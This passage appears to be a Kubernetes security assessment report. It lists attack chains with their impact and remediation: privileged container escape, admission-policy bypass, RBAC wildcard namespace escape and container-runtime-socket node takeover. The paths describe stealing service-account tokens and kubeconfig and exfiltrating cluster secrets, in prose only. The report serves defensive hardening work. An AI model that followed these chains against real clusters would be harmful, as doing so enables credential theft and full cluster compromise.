→ Access node filesystem, steal kubeconfig or SA token
breaks.impact: Complete cluster compromise from any vulnerable pod.
breaks.remediation: Enforce non-privileged workloads via admission control (CB-001) AND restrict RBAC escalation paths (CB-003). Both boundaries must hold simultaneously.

breaks.name: Policy Bypass to Persistent Node Compromise
path: → No admission webhook rejects it (policy bypass)
breaks.impact: Admission control failure removes the last prevention layer before container escape.
breaks.remediation: Deploy Kyverno/OPA with a deny-privileged policy (CB-005) so CB-001 risks cannot manifest.

breaks.name: Full Cluster Compromise via Triple Boundary Failure
path: → Steal SA token / kubeconfig from node
→ List and exfiltrate all cluster secrets (CB-007)
breaks.impact: Highest-severity scenario: node compromise + RBAC escalation + full secret exfiltration in one chain.
breaks.remediation: All three boundaries must be hardened simultaneously. Prioritize CB-001 (container hardening) as the chain entry point.

breaks.name: Namespace Escape via RBAC Wildcard
path: Workload in Namespace A exploits ClusterRoleBinding
→ Wildcard RBAC verbs allow access to Namespace B..N
→ RBAC escalation creates new bindings in target namespace
breaks.impact: Namespace boundary is completely meaningless when combined with wildcard RBAC.
breaks.remediation: Replace ClusterRoleBindings with namespace-scoped RoleBindings (CB-002) and eliminate wildcard RBAC (CB-003).

breaks.name: Container Runtime Socket to Node Takeover
path: → Spawn new container with privileged flag via runtime API
→ New container escapes to host filesystem
breaks.impact: Container runtime socket access is an unconditional node takeover when combined with privileged container capability.
breaks.remediation: Never mount runtime sockets in workloads (CB-006) and enforce non-privileged containers (CB-001).
